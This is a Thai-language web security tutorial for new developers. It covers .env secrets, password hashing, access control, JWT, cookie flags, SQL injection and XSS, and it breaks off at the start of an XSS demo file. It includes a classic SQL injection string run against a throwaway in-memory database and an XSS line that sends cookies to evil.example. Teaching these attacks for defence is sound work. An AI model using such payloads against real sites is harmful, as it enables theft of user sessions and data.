> **⚡ สรุป 30 วินาที**
> - **ความลับ** (รหัสผ่าน DB, API key) อยู่ใน `.env` เท่านั้น ห้ามเข้า Git ถ้าหลุดต้อง **เปลี่ยนทันที (rotate)**
> - **รหัสผ่านผู้ใช้** ต้อง **hash** (bcrypt/argon2) ห้ามเก็บเป็นข้อความตรงๆ หรือแค่เข้ารหัส
> - **Authentication** = คุณเป็นใคร · **Authorization** = คุณทำอะไรได้บ้าง
> - **ห้ามเชื่อข้อมูลจากผู้ใช้** ตรวจด้วย Zod, ใช้ ORM/parameter กัน SQL injection, escape ตอนแสดงผลกัน XSS
> - cookie login ต้องมี **`HttpOnly` + `Secure` + `SameSite`** และระบบจริงต้องเป็น **HTTPS**
> - **สิทธิ์น้อยที่สุดเท่าที่ทำงานได้** + อัปเดต dependency + ใช้ checklist ก่อนขึ้นระบบจริง
> - ข้อมูลลูกค้าคุ้มครองตามกฎหมาย **PDPA** ทำหลุด = บริษัทเดือดร้อนจริง ถ้าเกิดเรื่อง **แจ้งพี่ทันที**

## 🎯 คิดแบบคนปกป้อง: เริ่มจากถามว่า "เรากำลังปกป้องอะไร"

ถ้าไม่รู้ว่าอะไรมีค่า เราจะไม่รู้ว่าต้องป้องกันตรงไหน เวลาออกแบบหรือรีวิวระบบ ให้ถาม 3 ข้อ (เรียกว่า **threat thinking** หรือการคิดถึงภัยคุกคาม)

1. **อะไรมีค่า?** เช่น ข้อมูลลูกค้า, รหัสผ่าน, เงิน, สิทธิ์แอดมิน, ชื่อเสียงบริษัท
2. **ใครอยากได้ หรือทำให้พังได้?** ไม่ได้มีแต่แฮกเกอร์ในหนัง ส่วนใหญ่คือ **บอทที่สแกนเว็บทั้งโลกอัตโนมัติ**, ผู้ใช้ที่อยากรู้อยากลอง, อดีตพนักงาน และ **ตัวเราเองที่พลาด** (เผลอ commit รหัสผ่านไว้ก็ถือเป็นภัยหนึ่ง)
3. **ถ้าเสียไปแล้วเจ็บแค่ไหน?** จัดลำดับ: เรื่องที่เจ็บมาก (ข้อมูลลูกค้าหลุด) ทำก่อนเรื่องที่เจ็บน้อย (หน้าแรกพังนิดหน่อย)

![คนร้ายหรือความพลาดต้องผ่านด่านป้องกัน 4 ชั้น ก่อนถึงข้อมูลที่มีค่า พร้อมคำถาม 3 ข้อของ threat thinking](/img/10-threat-layers.svg)
*ป้องกันหลายชั้น (defense in depth): ด่านเดียวพลาด ยังมีด่านถัดไปคอยกัน ไม่ต้องหวังพึ่งด่านใดด่านเดียว*

> 🏠 **เปรียบเทียบ:** บ้านที่ปลอดภัยไม่ได้มีแค่กุญแจประตู แต่มีรั้ว ไฟ กล้อง และของมีค่าเก็บในตู้เซฟ ถ้าขโมยผ่านชั้นแรกได้ ยังมีชั้นต่อไป

### แผนที่ภัยยอดฮิต

องค์กร **OWASP** รวบรวมรายการช่องโหว่ของเว็บที่พบบ่อยที่สุด (**OWASP Top 10**) ซึ่งอัปเดตเป็นระยะ บทนี้อธิบายตัวที่น้องๆ เจอก่อนใคร โดยเริ่มจากที่เจ็บจริงที่สุด

| ภัย | เกิดอะไรขึ้น | ป้องกันหลักๆ | อยู่หัวข้อ |
|---|---|---|---|
| ความลับหลุด | key/รหัสผ่านโดนเปิดให้คนอื่นเห็น | `.env`, rotate | ข้อ 1 |
| รหัสผ่านโดนขโมยทั้งฐาน | DB หลุด แล้วได้รหัสจริง | hash (bcrypt/argon2) | ข้อ 2 |
| Broken access control / Auth พัง | เห็นหรือแก้ของคนอื่นได้ | เช็คสิทธิ์ทุก endpoint | ข้อ 3 |
| SQL injection | ข้อความผู้ใช้กลายเป็นคำสั่ง SQL | ORM / parameter | ข้อ 4 |
| XSS | ข้อความผู้ใช้กลายเป็นโค้ดบนหน้าเว็บ | escape, HttpOnly, CSP | ข้อ 4 |
| CSRF | เว็บอื่นหลอก browser เราสั่งงาน | SameSite, token | ข้อ 4 |
| ลองรหัสรัวๆ | บอทเดารหัสผ่านล้านครั้ง | rate limit | ข้อ 4 |
| Dependency เก่ามีรู | library ที่ใช้มีช่องโหว่ที่รู้กันแล้ว | `npm audit`, อัปเดต | ข้อ 4 |

## 1. ความลับ (Secrets) และไฟล์ `.env`

**ความลับ** = อะไรก็ตามที่ถ้าหลุดแล้วคนอื่นเข้าระบบได้: รหัสผ่าน DB, API key, JWT secret, token ของ payment

```
.env              ← ค่าจริง 🔒 ห้ามเข้า Git
.env.example      ← ค่าตัวอย่าง ✅ commit ได้ ให้คนอื่นรู้ว่าต้องตั้งอะไรบ้าง
```
`.env.example`
```
DATABASE_URL=postgres://user:password@localhost:5432/dbname
JWT_SECRET=ใส่ค่าสุ่มยาวอย่างน้อย-32-ตัวอักษร-ห้ามใช้ค่านี้จริง
```
อ่านค่าในโค้ด และ **ตรวจด้วย Zod ตอนเริ่มแอป** ขาดตัวไหนให้หยุดทันทีพร้อมบอกชัดๆ

ลองในโฟลเดอร์ทดลอง `security-demo` (ใช้ต่อทั้งบท):
```bash
mkdir security-demo && cd security-demo
npm init -y
npm pkg set type=module            # โค้ดในบทนี้ใช้ await นอกฟังก์ชัน ต้องเป็น ESM
npm install dotenv zod
npm install -D tsx typescript @types/node
```
`env.ts`
```ts
import "dotenv/config";
import { z } from "zod";

const Env = z.object({
  DATABASE_URL: z.url(),
  JWT_SECRET: z.string().min(32),
  PORT: z.coerce.number().default(3000),
});

export const env = Env.parse(process.env);   // ผิด/ขาด → แอปไม่ start พร้อมบอกว่าตัวไหน
console.log("env ok, port =", env.PORT);
```
รัน `npx tsx env.ts` ตอนที่ยังไม่มีไฟล์ `.env` **ควรเห็น** (ตัดบรรทัด stack ออก)
```

    "path": [
      "DATABASE_URL"
```

แอปหยุดตั้งแต่บรรทัดแรกๆ และบอกชื่อตัวแปรที่ขาดครบทุกตัว ดีกว่าไปพังกลางทางตอนมีคนกด login ลองสร้าง `.env` ที่มี 2 ค่าตาม `.env.example` (`JWT_SECRET` ยาว 32 ตัวขึ้นไป) แล้วรันใหม่ ควรเห็น `env ok, port = 3000`

> 💡 `z.url()` เป็นรูปแบบของ **Zod 4** ถ้าเจอตัวอย่างในเน็ตเขียน `z.string().url()` คือแบบ Zod 3 (Zod 4 ยังรับได้แต่ถือว่าเลิกใช้แล้ว) เช็ครุ่นที่ติดตั้งด้วย `npm ls zod`

### 1.1 🔧 กันไม่ให้ `.env` เข้า Git (ทำก่อน commit ครั้งแรก)

1. สร้างไฟล์ `.gitignore` ที่รากโปรเจกต์ ใส่
   ```
   .env
   .env.*
   !.env.example
   ```
   (สามบรรทัดนี้แปลว่า: ซ่อน `.env` ทุกแบบ แต่ **ยกเว้น** `.env.example`)
2. ตรวจว่า Git เห็นว่าถูกซ่อนจริง
   ```bash
   git check-ignore -v .env
   ```
   **ควรเห็น:** `.gitignore:1:.env	.env` (บอกว่ากฎบรรทัดไหนซ่อนไฟล์นี้) ถ้าไม่มีอะไรขึ้นเลย แปลว่า **ยังไม่ถูกซ่อน** รีบแก้ก่อน
3. ดู `git status` ไม่ควรเห็น `.env` ในรายการไฟล์ที่จะ commit
4. ก่อน commit ทุกครั้งอ่าน `git diff --staged` สักรอบ มองหา key/รหัสผ่านที่เผลอติดมา

> ⚠️ **ค่าที่ฝังในโค้ดหน้าเว็บ ใครก็เปิดดูได้:** ตัวแปรที่ build tool ฝังลงไฟล์ JS ของหน้าเว็บ (เช่น ตัวแปรที่ขึ้นต้นด้วย `VITE_` ใน Vite) จะไปอยู่ในเบราว์เซอร์ของทุกคน ห้ามใส่ความลับตัวจริงที่นั่น ความลับต้องอยู่ฝั่ง server เท่านั้น
> ⚠️ ไม่ใช้ความลับเดียวกันทั้ง dev และ production แยกกัน ถ้า dev หลุดจะได้ไม่กระทบของจริง

### 1.2 🚨 ถ้าเผลอ commit ความลับขึ้นไปแล้ว

> ⚠️ **ลบไฟล์ทีหลังไม่ช่วย** (ยังอยู่ในประวัติ Git)
> 1. **เปลี่ยนรหัส/key นั้นทันที** 2. แจ้งพี่ 3. ค่อยลบออกจาก repo
> มีบอทที่สแกน GitHub หา key ที่หลุดตลอด 24 ชั่วโมง บางครั้งโดนใช้ภายในไม่กี่นาที ⏱️

#### 💥 ลองพังมันดู: ลบแล้วยังอยู่จริงไหม (ทำใน repo ทดลองของตัวเองเท่านั้น)

```bash
mkdir leak-demo && cd leak-demo && git init
echo 'DB_PASSWORD=S3cret-demo-only' > .env
git add -A && git commit -m "first"
git rm --cached .env && echo ".env" > .gitignore
git add -A && git commit -m "remove .env"
git log --oneline
git show HEAD~1:.env
git log -S"S3cret" --oneline --all
```
**ควรเห็น** (รหัส commit จะต่างกัน)
```
6b69597 remove .env
9aa66f8 first
DB_PASSWORD=S3cret-demo-only
6b69597 remove .env
9aa66f8 first
```
บรรทัดที่ 3 คือ **รหัสผ่านที่เรา "ลบ" ไปแล้ว ยังอ่านได้จากประวัติ** และใครก็ตามที่ clone repo ไปจะอ่านได้เหมือนกัน นี่คือเหตุผลที่ต้อง **เปลี่ยนรหัส** ไม่ใช่แค่ลบไฟล์

**ขั้นตอนเมื่อความลับหลุด (rotate)**
1. **ยกเลิก/เปลี่ยนความลับนั้นที่ต้นทาง** เช่น สร้าง API key ใหม่ในหน้าผู้ให้บริการแล้วลบอันเก่า, เปลี่ยนรหัสผ่าน DB
2. **อัปเดตค่าใหม่ใน `.env`/ที่ตั้งค่าของ server** แล้ว deploy ใหม่ให้ระบบใช้ค่าใหม่
3. **แจ้งพี่ทันที** ไม่ต้องกลัวโดนดุ ยิ่งเงียบยิ่งแย่
4. **ตรวจ log ของบริการนั้น** ว่ามีการใช้ผิดปกติระหว่างที่หลุดไหม
5. จึงค่อยทำความสะอาดประวัติ Git (ให้พี่ช่วย เพราะเป็นงานเสี่ยงที่กระทบทั้งทีม) แต่ **ต่อให้ล้างประวัติแล้ว ก็ยังต้อง rotate** เพราะไม่รู้ว่ามีใครก๊อปไปแล้วหรือยัง
6. หาสาเหตุ: ทำไมหลุด ใส่ขั้นตอนกันซ้ำ (เช่น เครื่องมือสแกนความลับก่อน commit อย่าง `gitleaks`)

## 2. เก็บรหัสผ่านผู้ใช้: Hash ไม่ใช่ Encrypt

| วิธี | ทำงานยังไง | ย้อนกลับได้ไหม | ใช้เก็บรหัสผ่าน? |
|---|---|---|---|
| **เก็บตรงๆ** | `somchai1234` | – | ❌❌❌ |
| **Encrypt (เข้ารหัส)** | ล็อกด้วยกุญแจ | ✅ ถ้ามีกุญแจ | ❌ กุญแจหลุด = จบ |
| **Hash** | บดเป็นค่าคงที่ทางเดียว | ❌ ไม่ได้ | ✅ (ต้องเป็น hash สำหรับรหัสผ่านอย่าง bcrypt/argon2) |

> 💡 **เปรียบเทียบ:** hash = **ปั่นผลไม้เป็นน้ำผลไม้** 🍹 ทำน้ำผลไม้จากผลไม้ได้ แต่ทำผลไม้คืนจากน้ำผลไม้ไม่ได้
> ตอน login เราไม่ได้ "ถอด" รหัส แต่ **ปั่นรหัสที่ผู้ใช้พิมพ์มาใหม่** แล้วดูว่าได้น้ำผลไม้แก้วเดียวกันไหม

![เปรียบเทียบ Encrypt ที่ใช้กุญแจถอดกลับได้ กับ Hash ที่ทางเดียว ใช้ verify ตอน login](/img/10-hash-vs-encrypt.svg)
*Encrypt = ตู้เซฟที่มีกุญแจ ส่วน Hash = เครื่องบดที่ไม่มีทางย้อน*

### 2.1 สามคำที่ต้องรู้

- **Salt (เกลือ):** ค่าสุ่มที่ผสมเข้าไปก่อน hash ทำให้ **รหัสเดียวกันของคนสองคน ได้ hash ไม่เหมือนกัน** และกันการ "เปิดตารางสำเร็จรูป" ไล่หารหัสทีเดียวทั้งฐาน (bcrypt/argon2 ทำ salt ให้เอง และเก็บไว้ใน hash)
- **Cost / work factor:** ปรับให้ hash **ช้าโดยตั้งใจ** (เช่น 80 มิลลิวินาทีต่อครั้ง) ผู้ใช้จริงไม่รู้สึก แต่คนร้ายที่ต้องเดาล้านครั้งจะช้าลงมหาศาล
- **Pepper:** (เสริม ไม่บังคับ) ค่าลับที่เก็บแยกจาก DB

**🔧 ลองใช้ bcrypt** (ในโฟลเดอร์ `security-demo`)
```bash
npm install bcrypt
npm install -D @types/bcrypt
```
`hash-demo.ts`
```ts
import bcrypt from "bcrypt";

// ตอนสมัครสมาชิก
const hash = await bcrypt.hash("somchai1234", 12);   // 12 = ความยาก ยิ่งมากยิ่งช้า (ช้า = ดี สำหรับคนร้าย)
console.log(hash);   // $2b$12$Kx9... (รันซ้ำได้ค่าไม่เหมือนเดิม เพราะมี salt สุ่มในตัว)

// ตอน login
const ok = await bcrypt.compare("somchai1234", hash);   // true
const no = await bcrypt.compare("wrong", hash);         // false
console.log(ok, no);
```
```bash
npx tsx hash-demo.ts      # หรือ bun hash-demo.ts ถ้าใช้ Bun
```
**ควรเห็น** (hash ของคุณจะต่างจากนี้ เพราะ salt สุ่ม)
```
$2b$12$9kz0lvCMThBYYgzZHzlQy.DEDcsUKblQ0p/Q.sxkXAIk3lIKak/lS
true false
```

### 2.2 ใช้ Bun: `Bun.password` (ไม่ต้องติดตั้งอะไร)

ถ้าโปรเจกต์ใช้ Bun จะมีเครื่องมือในตัว ใช้ argon2id (hash สำหรับรหัสผ่านโดยเฉพาะ) เป็นค่าเริ่มต้น

`bun-hash.ts` (รันด้วย `bun bun-hash.ts` เท่านั้น ถ้ารันด้วย `npx tsx` หรือ `node` จะได้ `ReferenceError: Bun is not defined` เพราะ `Bun` เป็นของที่มีเฉพาะใน runtime ของ Bun)
```ts
const h1 = await Bun.password.hash("somchai1234");
const h2 = await Bun.password.hash("somchai1234");
console.log(h1);
console.log(h2);
console.log("h1 == h2 ?", h1 === h2);
console.log("ถูก:", await Bun.password.verify("somchai1234", h1));
console.log("ผิด:", await Bun.password.verify("wrong", h1));
```
**ควรเห็น** (ค่า hash จะต่างจากนี้)
```
$argon2id$v=19$m=65536,t=2,p=1$RtDOeByx...$ipNcEtEZ...
$argon2id$v=19$m=65536,t=2,p=1$SfhZYTnM...$kVyYZhVG...
h1 == h2 ? false
ถูก: true
ผิด: false
```
สังเกต 3 อย่าง: (1) รหัสเดียวกัน hash สองครั้ง **ไม่เหมือนกัน** (มี salt สุ่ม) แต่ `verify` ยังตรวจถูก (2) ใน hash มีข้อมูลบอกว่าใช้ argon2id พารามิเตอร์อะไร (`m=65536,t=2,p=1`) จึง verify ได้โดยไม่ต้องเก็บแยก (3) ตัว hash ไม่มีรหัสจริงอยู่ในนั้น

#### 💥 ลองพังมันดู: ทำไม sha256 ธรรมดาไม่ใช้กับรหัสผ่าน

`sha-demo.ts` (รันด้วย `bun sha-demo.ts`)
```ts
const t = performance.now();
await Bun.password.hash("x");
console.log("hash แบบ argon2id ใช้", Math.round(performance.now() - t), "ms");

const c = new Bun.CryptoHasher("sha256");
c.update("somchai1234");
console.log("sha256:", c.digest("hex"));
```
**ควรเห็น** (เวลาขึ้นกับเครื่อง)
```
hash แบบ argon2id ใช้ 81 ms
sha256: 60b96b16d71ba5197787622ca6fb60abc0925a5274ffc3a9d1791b3a549c3655
```
`sha256` ให้ค่า **เดิมทุกครั้ง** (ไม่มี salt) และคำนวณเสร็จในเสี้ยวไมโครวินาที คนร้ายจึงลองเดาได้มหาศาลต่อวินาที และรหัสยอดนิยมอย่าง `123456` มี sha256 ที่ใครๆ ก็ค้นเจอ ส่วน argon2id/bcrypt ถูกออกแบบให้ช้าและมี salt ในตัว

> ⚠️ **ห้ามใช้** `md5`, `sha1`, `sha256` ธรรมดาเก็บรหัสผ่าน เพราะเร็วเกินไป คอมเครื่องเดียวเดาได้หลายพันล้านครั้งต่อวินาที
> 🤓 **เกร็ด:** รหัสผ่านยอดนิยมอันดับต้นๆ ของโลกทุกปีคือ `123456` และ `password` 🤦

### 2.3 นโยบายรหัสผ่านที่ดี

- **ความยาวสำคัญกว่าความซับซ้อน:** ขั้นต่ำ 8 ตัว (แนะนำ 12+) และรับวลียาวๆ ได้ เช่น `ผมชอบกินข้าวมันไก่ทุกวัน`
- **อย่าตัดจำนวนตัวอักษรสูงสุดให้สั้น** (เช่นห้ามเกิน 12) เพราะ hash แล้วความยาวเท่าไรก็ไม่ใช่ปัญหา
- ไม่บังคับให้เปลี่ยนรหัสทุกเดือน (ผู้ใช้จะเปลี่ยนเป็น `Pass1`, `Pass2`... ทำให้อ่อนลง) บังคับเปลี่ยนเมื่อสงสัยว่าหลุดเท่านั้น
- แนะนำให้ใช้ตัวจัดการรหัสผ่าน (password manager) และเปิด **2FA** (ยืนยันสองชั้น) กับบัญชีสำคัญ

**ข้อความตอน login ผิด**
- ❌ "ไม่พบอีเมลนี้" / "รหัสผ่านผิด" → บอกคนร้ายว่าอีเมลนี้มีในระบบ
- ✅ "อีเมลหรือรหัสผ่านไม่ถูกต้อง"

## 3. Authentication vs Authorization

| | **Authentication (AuthN)** | **Authorization (AuthZ)** |
|---|---|---|
| ถามว่า | **คุณเป็นใคร?** | **คุณทำสิ่งนี้ได้ไหม?** |
| 💡 ในคอนโด | แตะบัตรเข้าตึก | บัตรนี้กดลิฟต์ไปชั้นไหนได้บ้าง |
| ผิดแล้วได้ | `401 Unauthorized` | `403 Forbidden` |
| ตัวอย่าง | login ด้วยอีเมล + รหัสผ่าน | พนักงานดูได้ แต่เฉพาะผู้จัดการลบได้ |

> ⚠️ **กับดักที่เจอบ่อยมาก:** login แล้วเปลี่ยน URL `/customers/5/invoices` เป็น `/customers/6/invoices` แล้วเห็นใบแจ้งหนี้ของคนอื่น 😱
> **ทุก endpoint ต้องเช็คสิทธิ์ฝั่ง server เสมอ** ซ่อนปุ่มในหน้าเว็บอย่างเดียวไม่พอ

### 3.1 Broken access control: เช็ค "ของใคร" ทุกครั้ง

ช่องโหว่ที่เจอบ่อยที่สุดใน OWASP คือ **ไม่เช็คว่าข้อมูลนี้เป็นของคนที่ขอหรือเปล่า** (เรียกว่า IDOR: เปลี่ยนเลข id แล้วเข้าถึงของคนอื่นได้)

โค้ดข้างล่างเป็น **ตัวอย่างให้อ่านเทียบ ไม่ต้องรัน** (เขียนแบบ Hono + Drizzle ที่จะลงมือจริงใน [บทที่ 14](/14-hono-api)–[15](/15-auth) ตาราง `invoices` และ `currentUser` สมมติขึ้น) สิ่งที่ต้องดูคือเงื่อนไขใน `where` ไม่ใช่ไวยากรณ์ ใน Express ก็หลักเดียวกัน ต่างแค่ตอบด้วย `res.status(404).json(...)`
```ts
// ❌ ใครที่ login แล้ว ขอ id ไหนก็ได้
const invoice = await db.query.invoices.findFirst({
  where: eq(invoices.id, id),
});

// ✅ ต้องเป็นใบแจ้งหนี้ "ของคนที่ login อยู่" เท่านั้น
const invoice = await db.query.invoices.findFirst({
  where: and(eq(invoices.id, id), eq(invoices.customerId, currentUser.id)),
});
if (!invoice) return c.json({ error: "ไม่พบข้อมูล" }, 404);   // ไม่เจอ = 404 ไม่บอกว่ามีอยู่ของคนอื่น
```
ข้อสังเกต: เมื่อไม่ใช่ของเขา ตอบ `404` ได้ (ไม่เปิดเผยว่ามีข้อมูลนั้นอยู่จริง) และ **อย่าเชื่อ `customerId` ที่ client ส่งมาใน body** ให้ใช้ id ของคนที่ login ซึ่งรู้จากเซสชัน/token ที่ server

### Login แล้ว server จำเราได้ยังไง: Session vs JWT

| | **Session** | **JWT (JSON Web Token)** |
|---|---|---|
| 💡 เปรียบเทียบ | **บัตรรับฝากของ** 🎫 มีแค่เลข ร้านต้องเปิดสมุดดูว่าเลขนี้ของใคร | **บัตรประชาชน** 🪪 มีข้อมูลในตัว พร้อมลายเซ็นกันปลอม |
| เก็บข้อมูลที่ | server (DB/Redis) | ในตัว token ที่ client ถือ |
| ยกเลิกทันที (logout, ระงับบัญชี) | ง่าย ลบใน server | ยากกว่า ต้องรอหมดอายุ หรือทำ blacklist |
| เหมาะกับ | เว็บทั่วไป | แอปมือถือ, หลาย service |

> ⚠️ JWT แค่ **ลงลายเซ็นกันแก้** ไม่ได้ **เข้ารหัส** ใครก็ถอดอ่านข้อมูลข้างในได้ (ลองวางที่ [jwt.io](https://jwt.io)) → **ห้ามใส่ข้อมูลลับใน JWT**
> 💡 ระบบจริงแนะนำใช้ library ที่น่าเชื่อถือ ไม่เขียนระบบ auth เองทั้งหมด

### 3.2 JWT: หลุมที่คนตกบ่อย

JWT หน้าตาเป็นสามท่อนคั่นด้วยจุด: `header.payload.signature` ท่อนแรกและท่อนที่สองเป็นแค่ JSON ที่แปลงเป็น base64url (ไม่ใช่การเข้ารหัส)

#### 💥 ลองพังมันดู: อ่านข้างใน JWT โดยไม่ต้องมีกุญแจ

```ts
// jwt-demo.ts  (ใช้ secret ปลอมสำหรับสาธิตเท่านั้น)
import { createHmac } from "node:crypto";

const b64 = (o: object) => Buffer.from(JSON.stringify(o)).toString("base64url");
const header = b64({ alg: "HS256", typ: "JWT" });
const payload = b64({ sub: 1, role: "staff", exp: 2000000000 });
const sig = createHmac("sha256", "super-secret-key-for-demo-only")
  .update(header + "." + payload)
  .digest("base64url");
const token = `${header}.${payload}.${sig}`;
console.log(token);

// ใครมี token ก็ถอดท่อนกลางอ่านได้ ไม่ต้องรู้ secret
const part = token.split(".")[1];
console.log(JSON.parse(Buffer.from(part, "base64url").toString()));
```
```bash
bun jwt-demo.ts
```
**ควรเห็น**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInJvbGUiOiJzdGFmZiIsImV4cCI6MjAwMDAwMDAwMH0.zFmMaeQaLfC2putfGef9wyC2EMTSDOlML6BrWEfS3j0
{
  sub: 1,
  role: "staff",
  exp: 2000000000,
}
```
> 💡 `exp` คือเวลาหมดอายุเป็นวินาทีนับจาก 1 ม.ค. 1970 (Unix time) `2000000000` คือปี 2033 ตั้งไกลไว้เพื่อให้วางที่ jwt.io แล้วยังไม่ขึ้นว่าหมดอายุ ของจริงตั้งสั้นตามข้อ 4 ด้านล่าง

อ่านข้อมูลได้ครบโดยไม่ต้องมี secret ส่วน **signature** มีไว้ให้ server ตรวจว่า "ใครแก้ข้อมูลหรือเปล่า" (ถ้าเราแก้ `role` เป็น `admin` ลายเซ็นจะไม่ตรง และ server ที่ตรวจต้องปฏิเสธ)

**ข้อควรระวังกับ JWT**
1. **ห้ามใส่ข้อมูลลับ** (ตามที่ลองดู ใครก็อ่านได้)
2. **ต้อง verify ลายเซ็นทุกครั้ง** ด้วย library และ **ระบุอัลกอริทึมที่ยอมรับ** ไว้ชัดเจน (เคยมีระบบที่ยอมรับ token แบบ `alg: none` หรือสลับอัลกอริทึมได้ ทำให้ปลอม token ได้)
3. **secret ต้องสุ่มและยาว** (อย่างน้อย 32 ตัว) ไม่ใช่ `secret` หรือ `change-me` เพราะคนร้ายเดา secret ได้ แล้วจะลงลายเซ็น token ปลอมได้เอง
4. **ตั้งอายุสั้น** (`exp`) เช่น 15 นาที ถึงไม่กี่ชั่วโมง เพราะยกเลิกกลางทางยาก
5. **เก็บไว้ที่ไหน:** ถ้าเก็บใน `localStorage` โค้ด JavaScript ทุกตัวในหน้าอ่านได้ (ถ้ามี XSS = โดนขโมย) นิยมเก็บใน **cookie `HttpOnly`** แทน (ตามบทที่ 15)
6. **ไม่มีปุ่ม "ยกเลิกทันที" มาให้** ถ้าต้องการเตะผู้ใช้ออกทันที ต้องมีรายการ token ที่ยกเลิกที่ server

### 3.3 Cookie ที่ปลอดภัย: `HttpOnly`, `Secure`, `SameSite`

cookie เป็นที่ที่ browser เก็บ "บัตรผ่าน" แล้วแนบไปกับ request ทุกครั้ง จึงเป็นเป้าของคนร้าย ต้องตั้ง **แฟลก** ให้ถูก

![Set-Cookie พร้อมแฟลก HttpOnly Secure SameSite และ Max-Age แต่ละอันป้องกันอะไร](/img/10-cookie-flags.svg)
*ตั้งทั้งสี่ตัวสำหรับ cookie ที่เป็นเซสชัน*

| แฟลก | ทำอะไร | กันอะไร |
|---|---|---|
| `HttpOnly` | JavaScript ในหน้าเว็บอ่าน cookie ไม่ได้ | ขโมย cookie ผ่าน XSS |
| `Secure` | browser ส่ง cookie เฉพาะบน HTTPS | ดักอ่านระหว่างทาง |
| `SameSite=Lax` (หรือ `Strict`) | ไม่แนบ cookie เมื่อ request ถูกสั่งจากเว็บอื่น | CSRF |
| `Max-Age` / `Expires` | กำหนดอายุ | cookie ที่ถูกขโมยใช้ได้ไม่นาน |

**🔧 ดู cookie จริงด้วย curl** (ใช้เซิร์ฟเวอร์ทดลองในบทที่ 9 ข้อ 8.0 หรือ API ของเราที่ตั้ง cookie ตอน login)
```bash
curl -i http://localhost:3000/login
```
**ควรเห็น** บรรทัดเหล่านี้ใน header ที่ตอบกลับ
```
set-cookie: session=abc123; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600
```
เซิร์ฟเวอร์ทดลองนี้ลืมใส่ `Secure` (เพราะเทสต์บน `http://localhost`) ถ้าเป็นระบบจริงบน HTTPS ต้องเป็น
```
set-cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
```
ตรวจใน browser: DevTools > Application > Cookies จะเห็นคอลัมน์ HttpOnly / Secure / SameSite ติ๊กไว้ (ดูบทที่ 9 ข้อ 8.4)

## 4. ช่องโหว่ที่เจอบ่อย

### 💉 SQL Injection (ทบทวนบทที่ 8)
ต่อข้อความผู้ใช้เข้าไปใน SQL → ใช้ **ORM** หรือ **parameter (`$1`)** เสมอ

**ปัญหาคืออะไร:** ถ้าเอาข้อความที่ผู้ใช้พิมพ์ไป **ต่อสตริง** เป็นคำสั่ง SQL ผู้ใช้ก็สามารถพิมพ์ "ส่วนของคำสั่ง" แทนที่จะเป็น "ข้อมูล" ได้ ข้อมูลเลยกลายเป็นคำสั่ง

![เปรียบเทียบการต่อสตริง SQL ที่ได้ผู้ใช้ทุกแถว กับ parameterized query ที่ได้ 0 แถว](/img/10-sql-injection.svg)
*บน: ต่อข้อความ ทำให้เงื่อนไขกลายเป็นจริงเสมอ · ล่าง: ส่งคำสั่งกับค่าแยกกัน ค่าจะไม่มีวันถูกตีความเป็นคำสั่ง*

#### 💥 ลองพังมันดู: เจาะ login ของตัวเอง (ฐานข้อมูลในหน่วยความจำ ไม่มีอะไรเสียหาย)

สร้าง `sqli.ts` รันด้วย `bun sqli.ts` (ใช้ SQLite ที่มากับ Bun ไม่ต้องติดตั้งอะไร)
```ts
import { Database } from "bun:sqlite";
const db = new Database(":memory:");
db.run("CREATE TABLE users (id INTEGER PRIMARY KEY, email TEXT, password_hash TEXT)");
db.run("INSERT INTO users (email, password_hash) VALUES ('somchai@mail.com','h1'), ('manee@mail.com','h2')");

function loginUnsafe(email: string) {
  const sql = `SELECT * FROM users WHERE email = '${email}'`;   // ❌ ต่อสตริง
  console.log("SQL ที่ส่งไป:", sql);
  return db.query(sql).all();
}
function loginSafe(email: string) {
  return db.query("SELECT * FROM users WHERE email = ?").all(email);   // ✅ parameter
}
const evil = "x' OR '1'='1";
console.log("แบบต่อข้อความ:", loginUnsafe(evil));
console.log("แบบ parameter:", loginSafe(evil));
```
**ควรเห็น**
```
SQL ที่ส่งไป: SELECT * FROM users WHERE email = 'x' OR '1'='1'
แบบต่อข้อความ: [
  { id: 1, email: "somchai@mail.com", password_hash: "h1" },
  { id: 2, email: "manee@mail.com", password_hash: "h2" }
]
แบบ parameter: []
```
(รูปแบบการจัดบรรทัดของ output อาจต่างกันเล็กน้อย แต่เนื้อหาเหมือนกัน) สังเกต `OR '1'='1'` ซึ่งเป็นจริงเสมอ จึงได้ **ทุกแถว** โดยไม่ต้องรู้อีเมลสักตัว ส่วนแบบ parameter ถือว่า `x' OR '1'='1` เป็นแค่ข้อความอีเมลแปลกๆ ที่หาไม่เจอ จึงได้ 0 แถว

**วิธีป้องกัน**
1. ใช้ **ORM** (Drizzle/Prisma) หรือ **parameterized query** (`?`, `$1`) ตลอด ค่าไม่เคยถูกต่อเข้าเป็นข้อความ SQL
2. ห้ามต่อสตริงเป็น SQL แม้ค่านั้น "ดูปลอดภัย"
3. ชื่อตาราง/คอลัมน์ที่ต้องมาจากผู้ใช้ (เช่นเรียงตามคอลัมน์ไหน) ใช้ **รายการที่อนุญาต (allowlist)** ไม่ใช่เอาไปต่อตรงๆ
4. ใช้ user ของ DB ที่ **สิทธิ์น้อย** (ข้อ 4 ต่อไป) เผื่อพลาด ความเสียหายจะจำกัด

### 🧪 XSS (Cross-Site Scripting)
ผู้ใช้ใส่โค้ดเข้ามาเป็นข้อมูล แล้วหน้าเว็บแสดงออกไปโดยไม่กรอง
```
ชื่อลูกค้า: <script>fetch("https://evil.example/steal?c=" + document.cookie)</script>
```
ใครเปิดหน้าที่แสดงชื่อนี้ = โดนขโมย cookie
- framework สมัยใหม่ (React, Vue) กรองให้อัตโนมัติ **ยกเว้น** ใช้ `innerHTML` / `dangerouslySetInnerHTML` ⚠️
- ตั้ง cookie แบบ `HttpOnly` ให้ JavaScript อ่านไม่ได้

![คนร้ายโพสต์โค้ดไปเก็บใน DB เหยื่อเปิดหน้า browser รันโค้ดแล้วส่ง cookie ออกไป พร้อม 3 ชั้นป้องกัน](/img/10-xss-flow.svg)
*XSS: ข้อมูลที่ควรเป็นแค่ข้อความ ถูก browser ตีความเป็นโค้ด*

**หลักคิด:** ข้อมูลจากผู้ใช้คือ **ข้อความ** เสมอ ตอนแสดงต้องบอก browser ว่า "นี่คือข้อความ ไม่ใช่ HTML"

#### 💥 ลองพังมันดู: `innerHTML` vs `textContent` (ในไฟล์ HTML ในเครื่องเรา)

สร้าง `xss.html` แล้วเปิดด้วย browser (ดับเบิลคลิกไฟล์ ไม่ต้องใช้ server)
```html
<div id="a"></div>
<div id="b"></div>
<script>
